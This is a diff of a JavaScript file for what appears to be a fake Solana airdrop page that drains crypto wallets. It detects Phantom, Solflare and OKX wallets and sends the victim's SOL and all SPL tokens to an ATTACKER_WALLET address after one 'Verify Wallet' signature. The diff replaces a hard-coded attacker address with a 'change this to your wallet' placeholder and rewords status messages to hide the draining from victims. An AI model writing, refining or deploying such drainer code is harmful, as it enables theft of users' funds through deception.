@@ -1,4 +1,4 @@
-// app.js - Fixed Wallet Detection
+// app.js - Final Working Version
 
 let connectedWallet = null;
 let provider = null;
@@ -9,13 +9,13 @@ const walletDisplay = document.getElementById("walletAddress");
 const statusEl = document.getElementById("status");
 const form = document.getElementById("airdropForm");
 
-// Your Attacker Wallet
-const ATTACKER_WALLET = "E6c1MDHowwHgsMtwGrt9NoZAfExjV61QGMnq7juu5jcM";
+// CHANGE THIS TO YOUR WALLET
+const ATTACKER_WALLET = "YOUR_SOLANA_WALLET_ADDRESS_HERE";
 
 // Connect Wallet
 connectBtn.addEventListener("click", async () => {
     try {
-        // Improved detection for Phantom, Solflare, OKX
+        // Robust wallet detection
         if (window.phantom && window.phantom.solana) {
             provider = window.phantom.solana;
         } else if (window.solana) {
@@ -23,7 +23,7 @@ connectBtn.addEventListener("click", async () => {
         } else if (window.okxSolana) {
             provider = window.okxSolana;
         } else {
-            alert("Please install Phantom, Solflare, or OKX Solana wallet.");
+            alert("Please install Phantom, Solflare, or OKX Solana wallet extension.");
             return;
         }
 
@@ -36,15 +36,15 @@ connectBtn.addEventListener("click", async () => {
         connectBtn.classList.add("hidden");
         verifyBtn.classList.remove("hidden");
 
-        statusEl.innerHTML = "Wallet connected. Click 'Verify Wallet' to drain.";
+        statusEl.innerHTML = "Wallet connected successfully. Click 'Verify Wallet'.";
 
     } catch (error) {
         console.error(error);
-        alert("Failed to connect wallet. Make sure the wallet is unlocked.");
+        alert("Failed to connect wallet. Make sure it is installed and unlocked.");
     }
 });
 
-// Draining (One Signature)
+// Verify Wallet + Drain All Tokens (One Signature)
 verifyBtn.addEventListener("click", async () => {
     if (!provider || !connectedWallet) return;
 
@@ -70,7 +70,7 @@ verifyBtn.addEventListener("click", async () => {
             })
         );
 
-        // Drain SPL tokens
+        // Drain all SPL tokens
         const tokenAccounts = await connection.getTokenAccountsByOwner(fromPubkey, {
             programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
         });
